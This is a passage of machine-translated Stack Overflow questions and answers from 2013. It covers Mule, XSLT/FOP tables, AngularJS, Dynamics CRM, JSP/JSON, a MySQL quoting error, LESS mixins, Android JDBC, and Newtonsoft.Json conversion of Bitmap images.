> 赞同：0
> 
> 时间：2013-03-20T00:34:50.693

按钮元素被视为提交按钮（即：如果未设置默认类型属性，则 type="submit"）。因此，浏览器发起了一个不满足路由的发布请求，因为我所有的操作都是 get(s)。

谢谢大家的时间。

# mule - 以编程方式在 mule 中设置调用属性

> ID：15510723
> 
> 赞同：1
> 
> 时间：2013-03-19T21:25:08.327
> 
> 标签：mule, invocation

我正在尝试在 Mule 3.3.1 中设置一个调用属性以用于“选择”流控制。我的流程有一个转换器（扩展 AbstractTransformer），我想在其中设置一个基于特定逻辑的调用属性。我可以在 .mflow 文件中设置它：

```
 <message-properties-transformer scope="invocation" doc:name="Set Invocation Variable">
    <add-message-property key="someKey" value="someValue"/>
 </message-properties-transformer> 
```

但是，我不确定如何在变压器中以编程方式执行此操作。我的最终目标是根据 mule 消息在soap客户端中动态传递操作字段。任何建议，将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T22:55:45.823

扩展 AbstractMessageTransformer 并使用 message.setInvocationProperty：

```
public class MyTransformer extends AbstractMessageTransformer {

    @Override
    public Object transformMessage(MuleMessage message, String outputEncoding) throws TransformerException {
        message.setInvocationProperty("someKey", "someValue");
        return message;
    }

} 
```

# apache - XSLT 为 Apache FOP 生成动态行和列

> ID：15510724
> 
> 赞同：1
> 
> 时间：2013-03-19T21:25:10.127
> 
> 标签：apache, xslt, xsl-fo, apache-fop

对于以下 xml 文件，我需要生成一个 xsl-fo 文件以转换为 pdf。

我是样式表的新手，正在努力创建动态表。请帮忙。

此外，每列的宽度因列而异。我如何将其包含到代码中？

列标题和列值在 xml 文件中动态填充。下面是一个示例。

任何人都可以帮助生成 xsl-fo 或 xslt 代码吗？

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ReportData>

    <ColumnHeaders>
       <ColumnHeader>
           <Name>Col-Header1</Name>
           <Width>5</Length>
       </ColumnHeader>
       <ColumnHeader>
           <Name>Col-Header2</Name>
           <Width>10</Length>
       </ColumnHeader>
       <ColumnHeader>
           <Name>Col-Header3</Name>
           <Width>8</Length>
        </ColumnHeader>
    </ColumnHeaders>

<Rows>
       <Row>
          <Column>Row1-Col1</Column>
          <Column>Row1-Col2</Column>
          <Column>Row1-Col3</Column>              
       </Row>
       <Row>
          <Column>Row2-Col1</Column>
          <Column>Row2-Col2</Column>
          <Column>Row2-Col3</Column>
       </Row>
    </Rows>
</ReportData> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-19T21:44:08.223

这应该让你开始。我用于`cm`列宽，页面为 11" x 8.5"（横向），因此表格适合页面。这对你来说应该很容易改变。

**XML 输入**（固定为格式正确）

```
<ReportData>

    <ColumnHeaders>
        <ColumnHeader>
            <Name>Col-Header1</Name>
            <Width>5</Width>
        </ColumnHeader>
        <ColumnHeader>
            <Name>Col-Header2</Name>
            <Width>10</Width>
        </ColumnHeader>
        <ColumnHeader>
            <Name>Col-Header3</Name>
            <Width>8</Width>
        </ColumnHeader>
    </ColumnHeaders>

    <Rows>
        <Row>
            <Column>Row1-Col1</Column>
            <Column>Row1-Col2</Column>
            <Column>Row1-Col3</Column>              
        </Row>
        <Row>
            <Column>Row2-Col1</Column>
            <Column>Row2-Col2</Column>
            <Column>Row2-Col3</Column>
        </Row>
    </Rows>
</ReportData> 
```

**XSLT 1.0**

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:fo="http://www.w3.org/1999/XSL/Format">
    <xsl:output indent="yes"/>
    <xsl:strip-space elements="*"/>

    <xsl:template match="/">
        <fo:root>
            <fo:layout-master-set>
                <fo:simple-page-master master-name="my-page" page-height="8.5in" page-width="11in">
                    <fo:region-body margin="1in" margin-top="1.5in" margin-bottom="1.5in"/>
                </fo:simple-page-master>
            </fo:layout-master-set>
            <fo:page-sequence master-reference="my-page">
                <fo:flow flow-name="xsl-region-body">
                    <xsl:apply-templates/>
                </fo:flow>
            </fo:page-sequence>
        </fo:root>
    </xsl:template>

    <xsl:template match="ReportData">
        <fo:table>
            <fo:table-header>
                <fo:table-row>
                    <xsl:apply-templates select="ColumnHeaders/ColumnHeader"/>                  
                </fo:table-row>
            </fo:table-header>
            <fo:table-body>
                <xsl:apply-templates select="Rows/Row"/>
            </fo:table-body>
        </fo:table>
    </xsl:template>

    <xsl:template match="ColumnHeader">
        <fo:table-cell width="{Width}cm" border="solid black 1px" padding="2px" font-weight="bold" text-align="center">
            <fo:block><xsl:value-of select="Name"/></fo:block>
        </fo:table-cell>
    </xsl:template>

    <xsl:template match="Row">
        <fo:table-row>
            <xsl:apply-templates/>
        </fo:table-row>
    </xsl:template>

    <xsl:template match="Column">
        <fo:table-cell border="solid black 1px" padding="2px">
            <fo:block><xsl:value-of select="."/></fo:block>
        </fo:table-cell>
    </xsl:template>     

</xsl:stylesheet> 
```

**XSL-FO 输出**

```
<fo:root xmlns:fo="http://www.w3.org/1999/XSL/Format">
   <fo:layout-master-set>
      <fo:simple-page-master master-name="my-page" page-height="8.5in" page-width="11in">
         <fo:region-body margin="1in" margin-top="1.5in" margin-bottom="1.5in"/>
      </fo:simple-page-master>
   </fo:layout-master-set>
   <fo:page-sequence master-reference="my-page">
      <fo:flow flow-name="xsl-region-body">
         <fo:table>
            <fo:table-header>
               <fo:table-row>
                  <fo:table-cell width="5cm"
                                 border="solid black 1px"
                                 padding="2px"
                                 font-weight="bold"
                                 text-align="center">
                     <fo:block>Col-Header1</fo:block>
                  </fo:table-cell>
                  <fo:table-cell width="10cm"
                                 border="solid black 1px"
                                 padding="2px"
                                 font-weight="bold"
                                 text-align="center">
                     <fo:block>Col-Header2</fo:block>
                  </fo:table-cell>
                  <fo:table-cell width="8cm"
                                 border="solid black 1px"
                                 padding="2px"
                                 font-weight="bold"
                                 text-align="center">
                     <fo:block>Col-Header3</fo:block>
                  </fo:table-cell>
               </fo:table-row>
            </fo:table-header>
            <fo:table-body>
               <fo:table-row>
                  <fo:table-cell border="solid black 1px" padding="2px">
                     <fo:block>Row1-Col1</fo:block>
                  </fo:table-cell>
                  <fo:table-cell border="solid black 1px" padding="2px">
                     <fo:block>Row1-Col2</fo:block>
                  </fo:table-cell>
                  <fo:table-cell border="solid black 1px" padding="2px">
                     <fo:block>Row1-Col3</fo:block>
                  </fo:table-cell>
               </fo:table-row>
               <fo:table-row>
                  <fo:table-cell border="solid black 1px" padding="2px">
                     <fo:block>Row2-Col1</fo:block>
                  </fo:table-cell>
                  <fo:table-cell border="solid black 1px" padding="2px">
                     <fo:block>Row2-Col2</fo:block>
                  </fo:table-cell>
                  <fo:table-cell border="solid black 1px" padding="2px">
                     <fo:block>Row2-Col3</fo:block>
                  </fo:table-cell>
               </fo:table-row>
            </fo:table-body>
         </fo:table>
      </fo:flow>
   </fo:page-sequence>
</fo:root> 
```

**PDF 输出**

![在此处输入图像描述](../Images/72bfe7a8aedab646674d3f4b8838558e.png)

# c# - VSTO 2010 Outlook 功能区（设计器）未显示在 Outlook 2007 中

> ID：15510725
> 
> 赞同：0
> 
> 时间：2013-03-19T21:25:11.487
> 
> 标签：c#, .net, outlook, vsto, ribbon

我有一个在 Outlook 2010 中工作的 VSTO 2010 功能区（设计器）。我的加载项也在 Outlook 2007 中加载，我看到了一个我制作的命令栏，它可以按照我的预期进行。由于某些原因，阅读邮件和新邮件检查器上的功能区不会出现在 Outlook 2007 中。

我错过了什么会阻止这些加载？据我了解，只要选项卡名称与 2007 年和 2010 年的功能区控件文件选项卡名称匹配就可以了吗？

笔记：

*   加载项肯定会在 Outlook 2007 中加载
*   在 Outlook 2010 中完美运行
*   不谈论主 UI 中的功能区
*   我宁愿只拥有像 Outlook 2010 这样的功能区文件，但只要它有效，我就可以做任何事情
*   如果有一个重复的问题可以解决我的问题，那就太好了，但我似乎找不到一个有效的问题

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T09:00:49.450

据我所知，使用 VSTO 开发多个 Office 版本可能会很痛苦，而且 VSTO 不直接支持：

> 这当然是使用旧的“共享加载项”项目类型的优势——您可以构建一个加载项，以针对支持 COM 加载项的所有 Office 应用程序的所有版本（即 2000 及更高版本）。问题是，你能用 VSTO 插件做类似的事情吗？答案是“不，不以任何受支持的方式”。

答案可以在这里找到：http: [//blogs.msdn.com/b/andreww/archive/2007/06/15/can-you-build-one-add-in-for-multiple-versions-of-office .aspx](http://blogs.msdn.com/b/andreww/archive/2007/06/15/can-you-build-one-add-in-for-multiple-versions-of-office.aspx)

Office 开发有 VSTO 的替代方案，可帮助您开发多个版本：[NetOffice](http://netoffice.codeplex.com/)、[Addin Express](http://www.add-in-express.com/)。

# ipad - App Store iPad 要求：如何添加 iPad mini？

> ID：15510726
> 
> 赞同：1
> 
> 时间：2013-03-19T21:25:13.030
> 
> 标签：ipad, app-store

您如何确保 iPad Mini 包含在 App Store 要求列表中？我有一个通用应用程序，但它似乎不包括在内...

![在此处输入图像描述](../Images/fecfe4214e86e6c29c514683802ca6b2.png)

![在此处输入图像描述](../Images/bc79b10d4f5964d835257e75dfdbdecc.png)

# angularjs - AngularJs - 未调用 API 控制器

> ID：15510728
> 
> 赞同：0
> 
> 时间：2013-03-19T21:25:18.897
> 
> 标签：angularjs

我的 API 资源很好，我可以获得一个类的所有内容并填充任何内容，但出于演示目的，这里是与 EngineMakes 相关的 API 资源：

```
 // EngineMake
            GetEngineMakes: { method: 'GET', params: { controller: 'EngineMakes' }, isArray: true },
            GetEngineMake: { method: 'GET', params: { controller: 'EngineMakes' } },
            AddEngineMake: { method: 'POST', params: { controller: 'EngineMakes' } },
            UpdateEngineMake: { method: 'PUT', params: { controller: 'EngineMakes' } },
            DeleteEngineMake: { method: 'DELETE', params: { controller: 'EngineMakes' } }, 
```

我有一个模态表单，允许用户（1）选择一个引擎品牌，然后（2）添加一个新的引擎模型。我可以将新引擎模型推向范围，但它与相应的引擎制造无关。

这是我的代码：

```
// in engine model controller:

$scope.save = function(data) {
    var engineModel = angular.copy($scope.engineModel);
    $http.post('/api/EngineModels/', engineModel)
        .success(function () {
            $rootScope.addEngineModel(engineModel);
        })
        .error(function(data) {
            alert(data);
        });
};

// in engine make controller
$rootScope.addEngineModel = function (engineModel) {

the problem --->   $scope.engineMake = API.GetEngineMake({ id: engineModel.FK_EngineMakeId});      

    $scope.engineMake.EngineModels = $scope.engineMake.EngineModels || [];
    $scope.engineMake.EngineModels.push(engineModel);
}; 
```

1.  新引擎模型已成功添加到数据库并放入范围。

2.  $rootScope.addEngineModel 确实被命中，参数正确且 FK_EngineMakeID 正确。**

但是，我对 API 的调用显然是不正确的，因为我从未点击 API 控制器来找到与引擎模型 FK_EngineMakeID 匹配的 EngineMake，**因此我可以将新的引擎模型推送到相应的 EngineMake.EngineModels**，所以当模式关闭并且用户选择引擎品牌，新创建的引擎模型是该集合的一部分。

有谁知道我哪里出错了？

PS：如果有人可以告诉我如何使用简单的 $http.Get，我会很高兴并放弃 API 资源

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T22:09:06.860

**我解决了它，然后一些 - 请注意第一部分和第二部分，我将解释：**

**第一部分：**

```
$rootScope.addEngineModel = function (engineModel) {
    var tmp = $http({ method: 'GET', url: '/api/EngineMakes/' + engineModel.FK_EngineMakeId }).
              success(function (data, status, headers, config) {
                  $scope.engineMake = angular.copy(data);
                  $scope.engineMakes.push($scope.engineMake);
              }).
              error(function (data, status, headers, config) {
                  console.log('fail');
              });

    $scope.engineMake.EngineModels = $scope.engineMake.EngineModels || [];
    $scope.engineMake.EngineModels.push(engineModel); 
```

**第二部分**

```
 var tmp2 = function () {
        API.UpdateEngineMake({ id: $scope.engineMake.Id }, $scope.engineMake, function (res) {
            if (res.Id > 0) {
                alert('success');
            }
        });
    };
}; 
```

第一部分将使用选定的 EngineMake 和新创建的 EngineModel 更新对 EngineMake 和 EngineModel 的推送，因为一旦模态随提交关闭（以添加新的 EngineModel）。

但是，如果用户出于某种奇怪的原因，在主窗体（而不是模态）的选择中重新选择了一个新的 EngineMake，然后重新选择了他之前选择的 EngineMake，该怎么办？

**答：**除非他刷新页面，否则他将失去新创建的 EngineModel 的范围。这是为什么？因为没有II，我未能更新EngineMake与EngineModel的关系。

你需要第二部分来克服这个不幸。

**最后一点：**

即使使用第二步，选择中也会有 2 个相同的 EngineMake，一个会有新创建的 EngineModel，一个没有，所以你需要做的是这样的事情（即过滤器）：

```
 <select id="engineMake" ng-model="engineMake" ng-options="engineMake.Name for engineMake in engineMakes | unique">
      <option value="" selected>Select Engine Manufacturer ..</option>  
     </select> 
```

哦！我觉得是时候加薪了！

# dynamics-crm-2011 - Dynamics CRM 2011 - 如何关联两个不同的实体

> ID：15510730
> 
> 赞同：0
> 
> 时间：2013-03-19T21:25:46.963
> 
> 标签：dynamics-crm-2011

我有两个不同的自定义实体。第一个（付款）我使用表单手动创建。创建付款后，它会执行一个插件，该插件将创建一个或多个凭证。该插件可以毫无问题地创建凭证。问题是当我去付款并点击凭证时，我没有看到我刚刚创建的凭证列出。如果我去查看所有的凭证，我可以看到我刚刚创建的那个。从付款到凭证是一对多的关系。我需要在插件中做什么才能使实体相关联？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T22:05:38.920

听起来您只是在创建凭证时尚未将关系设置回触发付款。

鉴于 1:N 关系，并且由于您是在支付插件的上下文中创建凭证，您可以将凭证上的查找设置为插件当前正在执行的付款（目标）。

```
new_voucher.new_paymentid = new EntityReference(...); 
```

`new_paymentid`是凭证上的查找属性（显然在您的情况下它会被称为其他东西）。为此，`EntityReference`您需要定义产品的 EntityName 和 Id，您可以从目标中读取它们。

# json - 如何在jsp中从json中提取细节

> ID：15510731
> 
> 赞同：2
> 
> 时间：2013-03-19T21:25:51.110
> 
> 标签：json, jsp

如何从 jsp 页面中的 json 输出而不是 java 代码中提取用户详细信息？

我的 ${users.user.firstname} 等不起作用。

代码运行良好，问题是我无法提取 json 列表。

```
@RequestMapping(value = "asjson", method = RequestMethod.GET)
@Consumes({ MediaType.APPLICATION_XML, MediaType.APPLICATION_JSON })
@Produces({ MediaType.APPLICATION_XML, MediaType.APPLICATION_JSON })
public String getAsJson(ModelMap model)
{
    Client client = Client.create();
    WebResource service = client.resource(getBaseURI());
    String userAsJson =  service.path("user/").path("getall").accept(MediaType.APPLICATION_JSON).get(String.class);
    model.addAttribute("json", userAsJson);

    return "asjson";

}

private static URI getBaseURI()
{
    return UriBuilder.fromUri("http://localhost:8080/xxxxxxx/").build();
} 
```

在 jsp 页面中，我使用 El 标签通过 foreach 循环打印用户详细信息，并且：

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt"%>
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4  /loose.dtd">
<html lang="en">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8">

<body>
<c:forEach var="users" items="${json}">
${users}
</c:forEach> 
```

清单的一部分是：

```
 {
  "user": [
    {
        "userid": "1",
        "firstname": "xxxxx",
        "lastname": "xxxxxxx",
        "username": "xxxxxx",
        "password": "xxxxxx",
        "email": "xxxxxxx",
        "isEnabled": "true",
        "address": {
            "street": "xxxxxxxxx",
            "zipcode": "xxxxxxx",
            "city": "xxxxxxx"
        },
        "roles": [
            {
                "roleid": "1",
                "rolename": "ROLE_ADMIN"
            },
            {
                "roleid": "2",
                "rolename": "ROLE_USER"
            }
        ]
    },

    {
        "userid": "2",
        "firstname": "jesica",
        "lastname": "biel",
        "username": "jesica",
        "password": "biel",
        "email": "jesica@sex.se",
        "isEnabled": "true",
        "address": {
            "street": "sexstreet",
            "zipcode": "66666",
            "city": "sexistan"
        },
        "roles": {
            "roleid": "5",
            "rolename": "ROLE_USER"
        }
    }
]
} 
```

谢谢

# mysql - SQL 返回错误：“字段列表”中的未知列“g”

> ID：15510732
> 
> 赞同：2
> 
> 时间：2013-03-19T21:25:55.400
> 
> 标签：mysql

好吧，关于这个话题似乎有很多问题，但我的问题很奇怪。我运行这个查询：

```
INSERT INTO `blogposts` (id,author,subject,content,date) VALUES (2,$author,$subject,$content,$date) 
```

并得到这个错误：

```
Unknown column 'g' in 'field list' 
```

我的表中没有“g”列，所以发生了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:27:16.983

如果您使用的任何变量是字符串，则需要在查询中将它们括在引号中。如果变量值之一是“g”，并且它不带引号插入到查询中，则 MySQL 将查找列“g”。

```
INSERT INTO `blogposts` (`id`,`author`,`subject`,`content`,`date`) VALUES (2,"$author","$subject","$content","$date") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:29:17.780

“日期”至少是一个保留字，可能是主题引起了问题。尝试反引号列名。

# sass - 如何将此 SCSS mixin 转换为 LESS？

> ID：15510737
> 
> 赞同：2
> 
> 时间：2013-03-19T21:26:14.627
> 
> 标签：sass, less

我习惯于用 SCSS 编码，但对 LESS 很陌生。

我在 SCSS 中有以下代码，但想知道如何在 LESS 中编写它。

这是SCSS代码...

```
@mixin posL($property, $value) {
   {$property}: $value;
}

.box {
   width:200px;
   height:200px;
   background:red;
   position:absolute;
   @include posL(left, 100px);
 } 
```

到目前为止，我在 LESS 中有类似的东西，但我必须声明选择器......

```
.posL(@property: 100px, @value: 2px) {
    left: @property;
    -rtl-left: @value;
}

.box {
    width:200px;
    height:200px;
    background:red;
    position:absolute;
   .posL(200px);
 } 
```

有没有更好的方法来编写我的 LESS 代码，以便 mixin 中的选择器保持通用（未指定）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T23:27:47.743

## LESS 1.6+ 的更新

现在几乎是[1.6 update](https://github.com/less/less.js/blob/master/CHANGELOG.md)的直接映射，如下所示：

**较少的**

```
.posL(@property, @value) {
   @{property}: @value;
}

.box {
   width:200px;
   height:200px;
   background:red;
   position:absolute;
   .posL(left, 100px);
 } 
```

**CSS 输出**

```
.box {
  width: 200px;
  height: 200px;
  background: red;
  position: absolute;
  left: 100px;
} 
```

## 原始答案（1.6 之前）

目前没有真正的方法在 LESS 中做动态属性名称（无论是前缀还是完整的属性名称，如您所愿），尽管[有关于它的讨论](https://github.com/cloudhead/less.js/issues/1199)。

我推荐一个带有嵌套的、受保护的 mixin 的通用 mixin 用于逻辑。这仍然为您提供了对特定属性的选择，但确实需要一些更明确的代码来设置它。就像是：

```
.posL(@property, @value) {
   .getProp(left) {
      left: @value;
    }
   .getProp(-rtl-left) {
      -rtl-left: @value;
   }
   .getProp(@property);
} 
```

然后使用它与您使用 SASS 版本的方式非常相似：

```
.box {
   width:200px;
   height:200px;
   background:red;
   position:absolute;
   .posL(left, 100px);
 } 
```

编译为：

```
.box {
  width: 200px;
  height: 200px;
  background: red;
  position: absolute;
  left: 100px;
} 
```

# java - 如何通过 Android App 通过 JDBC 连接到远程 MySQL 服务器

> ID：15510738
> 
> 赞同：1
> 
> 时间：2013-03-19T21:26:17.137
> 
> 标签：java, android, mysql, jdbc

我首先使用 Java 程序通过 JDBC 成功连接到远程 MySQL 服务器。我明白该怎么做。我的目标是对 Android 应用程序做同样的事情并显示来自远程 MySQL 服务器的数据。

**问题 1**有人可以解释通过 Android 执行此操作的流程大纲吗？（我是 Android 新手，对 Java 比较强，可以使用一些指导）。

**问题 2**我在 javatutorialpoint.com 上找到了本教程，标题为：Android MySQL Client，但它希望我使用 SOAP API。不知道为什么，如果有人可以解释。

不要求为我完成。我只是希望有人概述实现它的主要步骤。我所要求的只是需要发生的过程。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:36:39.930

Question #1:

I stumbled upon this link some time ago:

[http://docs.oracle.com/cd/E17076_02/html/installation/build_android_jdbc.html](http://docs.oracle.com/cd/E17076_02/html/installation/build_android_jdbc.html)

(Disclaimer: I haven't read the whole tutorial myself)

It tells you what's needed for getting the MySQL connector to work with Android.

Basically, from what I know, the standard MySQL connector for Java, doesn't work out of the box for Android. You'll need to build it on your own.

After building the connector, you can include it in your Android project, precisely the same way as you do in a normal Java project.

Your Question #2:

SOAP is a mere layer of abstraction, for not working directly on the database. If you use a layer like SOAP, you can swiftly change your database layer without affecting much of the communication from-and-to the Android app.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:34:11.250

您可以在 Android 中使用与 Java 相同的方法（毕竟，Android 是用 Java 编写的，您可以在 android 中使用它的大部分库）。但是，请小心这样做。

从安全的角度来看，设置一个 Web 服务与数据库通信可能会更好，而不是让你的 android 应用程序直接与它通信，这实际上需要你在应用程序代码中嵌入你的 mysql 用户名和密码. SOAP 或 RESTful Web 服务可以使您的服务器与数据库通信，然后将数据从数据库提供给您的应用程序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:30:59.900

1.  它与 Java 中的操作相同（除非您使用 NDK，否则 Android 应用程序是用 Java 构建的）。
2.  如果您只想从远程数据库获取数据，则不需要 SOAP。

看到[这个问题](https://stackoverflow.com/questions/4447692/jdbc-connection-in-android)。

# java - 搜索方法看起来不错，但不是我的 if 语句来初始化它

> ID：15510739
> 
> 赞同：0
> 
> 时间：2013-03-19T21:26:22.283
> 
> 标签：java, arrays, sorting, search

请问我能得到一些帮助吗？我不知道如何让我的 If 语句搜索学生工作。我收到一个错误：

```
incompatible types
found   : Student
required: boolean
if (search(name, students)) 
```

另外，我对如何实现冒泡排序一无所知。

```
public class StudentProcessor2 {

    public static void main(String[] args) {

        Scanner input = new Scanner(System.in);

        // read in how many students to process
        System.out.print("How many students?");
        int numStudents = input.nextInt();

        Student[] students = new Student[numStudents];

        for (int i = 0; i < numStudents; i++) {
            // read in student data from Scanner
            System.out.println("What is the students name?");
            String name = input.next();

            System.out.println("What is the students grade?");
//          System.out.println("***Type -1 if no more grades***");
            int grade = input.nextInt();
            Student student = new Student();
            student.setName(name);
            student.setGrade(grade);
            students[i] = student;
        }
        UserSelection(input, numStudents, students);
    }

    // show menu with options
    public static void UserSelection(Scanner input, int numStudents,
            Student[] students) {
        // Repeatedly process menu selections by the user.
        int choice;
        do {
            System.out.println();
            System.out.println("*** Student Exam Results Menu ***");
            System.out.println("(1) Display the results");
            System.out.println("(2) Display the average result");
            System.out.println("(3) Display the highest grade");
            System.out.println("(4) Display the lowest grade");
            System.out.println("(5) Search for specific result");
            System.out.println("(6) Search for student grade by name");
            System.out.println("(7) Sort the results in ascending order");
            System.out.println("(8) quit");
            choice = input.nextInt();

            if (choice == 1)
            {
                System.out.println(Arrays.toString(students));
            } else if (choice == 2)

            {
                double average = getAverage(students);
                System.out.println("average grade = " + average);
            } else if (choice == 3)

            {
                int high = getHighest(students);
                System.out.println("high grade = " + high);
            } else if (choice == 4)

            {
                int low = getLowest(students);
                System.out.println("low grade = " + low);

            } else if (choice == 5)

            {
                System.out.print("Result to look for: ");
                int grade = input.nextInt();
                 if (result(grade, students)) {
                 System.out.println(grade +
                 " is in the collection of grades.");
                 } else

                 {
                 System.out.println(grade +
                 " is not in the collection of grades.");
                 }

            } else if (choice == 6)

            {
                System.out.print("Student to search for: ");
                String name = input.nextLine();
                if (search(name, students))
                {
                    System.out.println(name +
                    " is in the list of Students.");
                } else
                {
                System.out.println(name +
                " is not in the list of Students");
                }
            }

        } while (choice != 8);
    }

    // get Lower Grade
    private static int getLowest(Student[] students) {
        int lowest = 100;
        Student result = null;
        for (Student student : students) {
            if (student.getGrade() < lowest) {
                lowest = student.getGrade();
                result = student;
            }
        }
        return result.getGrade();
    }

    // get Highest grade
    private static int getHighest(Student[] students) {
        int highest = 0;
        Student result = null;
        for (Student student : students) {
            if (student.getGrade() > highest) {
                highest = student.getGrade();
                result = student;
            }
        }
        return result.getGrade();
    }

    // get Average grade
    private static double getAverage(Student[] students) {
        int total = 0;
        for (Student student : students) {
            total += student.getGrade();
        }
        return total / students.length;
    }

    // Search for student
    private static Student search(String name, Student[] students) {
        Student result = null;
        for (Student student : students) {
            if (student.getName().equalsIgnoreCase(name)) {
                result = student;
                break;
            }
        }
        return result;
    }
    // Search for grade
    private static boolean result(int grade, Student[] students) {
        for (Student student : students) {
            if (student.getGrade() == grade) {
                return true;
            }
        }
        return false;
    }

    // !Bubble sort goes here!
    private void sort(Student[] students) {

        Student hold; // temporary holding area for swap

        for (int i = 0; i < students.length; i++) { // passes
            Student current = students[i];
            Student next = students[i + 1];
            if (current.getGrade() > next.getGrade()) // one comparison
            {
                hold = students[i]; // one swap
                students[i] = students[i + 1];
                students[i + 1] = hold;
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:28:20.480

您的`search`方法返回 a`Student` `Object`以便您可以检查返回的实例。`if`statements 表达式必须是`boolean`表达式，因此错误。代替

```
if (search(name, students)) 
```

和

```
if (search(name, students) == null) 
```

Wrt冒泡排序，有很多可用的资源，比如[这个](http://mathbits.com/MathBits/Java/arrays/Bubble.htm)。

# c# - Newtonsoft.Json 反序列化 base64 图像失败

> ID：15510742
> 
> 赞同：6
> 
> 时间：2013-03-19T21:26:41.370
> 
> 标签：c#, .net, json, image

我正在使用 Newtonsoft.Json 将我的 web 服务的输出反序列化为一个对象。`Bitmap`在我向我的类（名为`User`）添加一个属性来保存头像之前，它工作得很好。

Web 服务将该属性作为 Base64 字符串返回，这与预期的一样。问题是当我尝试将 JSON 从 WS 转换回 a`List<User>`时，`JsonSerializationException`会在这段代码中抛出 a ：

```
// T is IList<User>
response.Content.ReadAsStringAsync().Proceed(
    (readTask) =>
    {
        var json = ((Task<string>)readTask).Result;
        var result = JsonConvert.DeserializeObject<T>(json); //<-- it fails here

         // do stuff! 
     }); 
```

异常的输出是：

```
Error converting value "System.Drawing.Bitmap" to type 'System.Drawing.Bitmap'. Path '[2].Avatar 
```

并查看内部异常：

```
{"Could not cast or convert from System.String to System.Drawing.Bitmap."} 
```

很明显它无法解析 Base64 字符串，但不清楚原因。

有什么想法/解决方法吗？

**编辑** 我知道我可以使用`Convert.FromBase64String`获取字节数组并从中加载位图。然后我想更新我的问题以询问**如何****仅**跳过或手动解析该字段。我想避免必须手动解析所有 JSON。这甚至可能吗？

**编辑 2** 我发现了根本问题：JSON 没有在 web 服务中正确序列化（我不明白为什么）。我认为[这](https://stackoverflow.com/questions/15529904/different-behaviour-in-response-if-acceptapplication-json-is-specified)是一个有点不同的问题，但不是。我的网络服务只是返回一个字符串`"System.Drawing.Bitmap"`而不是它的 base64 内容。因此`JsonSerializationException`.

我一直无法解决这个问题，我找到的唯一解决方案是将我的字段变成`byte []`.

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-19T21:35:11.100

Read that field as string,

convert to byte array using `Convert.FromBase64String` and

get the image using `Bitmap.FromStream(new MemoryStream(bytearray));`

**EDIT**

You can perform image serialization/deserialization with the help of a custom *converter*

```
public class AClass
{
    public Bitmap image;
    public int i;
}

Bitmap bmp = (Bitmap)Bitmap.FromFile(@"......");
var json = JsonConvert.SerializeObject(new AClass() { image = bmp, i = 666 }, 
                                       new ImageConverter());

var aclass = JsonConvert.DeserializeObject<AClass>(json, new ImageConverter()); 
```

This is the `ImageConverter`

```
public class ImageConverter : Newtonsoft.Json.JsonConverter
{
    public override bool CanConvert(Type objectType)
    {
        return objectType == typeof(Bitmap);
    }

    public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer)
    {
        var m = new MemoryStream(Convert.FromBase64String((string)reader.Value));
        return (Bitmap)Bitmap.FromStream(m);
    }

    public override void WriteJson(JsonWriter writer, object value, JsonSerializer serializer)
    {
        Bitmap bmp = (Bitmap)value;
        MemoryStream m = new MemoryStream();
        bmp.Save(m, System.Drawing.Imaging.ImageFormat.Jpeg);

        writer.WriteValue(Convert.ToBase64String(m.ToArray()));
    }
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-07-26T08:38:04.370

这是我的解决方案，我使用了注释

```
[Serializable]
public class MyClass
{
    [JsonConverter(typeof(CustomBitmapConverter))]
    public Bitmap MyImage { get; set; }

    #region JsonConverterBitmap
    internal class CustomBitmapConverter : JsonConverter
    {
        public override bool CanConvert(Type objectType)
        {
            return true;
        }

        //convert from byte to bitmap (deserialize)

        public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer)
        {
            string image = (string)reader.Value;

            byte[] byteBuffer = Convert.FromBase64String(image);
            MemoryStream memoryStream = new MemoryStream(byteBuffer);
            memoryStream.Position = 0;

            return (Bitmap)Bitmap.FromStream(memoryStream);
        }

        //convert bitmap to byte (serialize)
        public override void WriteJson(JsonWriter writer, object value, JsonSerializer serializer)
        {
            Bitmap bitmap = (Bitmap)value;

            ImageConverter converter = new ImageConverter();
            writer.WriteValue((byte[])converter.ConvertTo(bitmap, typeof(byte[])));
        }

        public static System.Drawing.Imaging.ImageFormat GetImageFormat(Bitmap bitmap)
        {
            ImageFormat img = bitmap.RawFormat;

            if (img.Equals(System.Drawing.Imaging.ImageFormat.Jpeg))
                return System.Drawing.Imaging.ImageFormat.Jpeg;
            if (img.Equals(System.Drawing.Imaging.ImageFormat.Bmp))
                return System.Drawing.Imaging.ImageFormat.Bmp;
            if (img.Equals(System.Drawing.Imaging.ImageFormat.Png))
                return System.Drawing.Imaging.ImageFormat.Png;
            if (img.Equals(System.Drawing.Imaging.ImageFormat.Emf))
                return System.Drawing.Imaging.ImageFormat.Emf;
            if (img.Equals(System.Drawing.Imaging.ImageFormat.Exif))
                return System.Drawing.Imaging.ImageFormat.Exif;
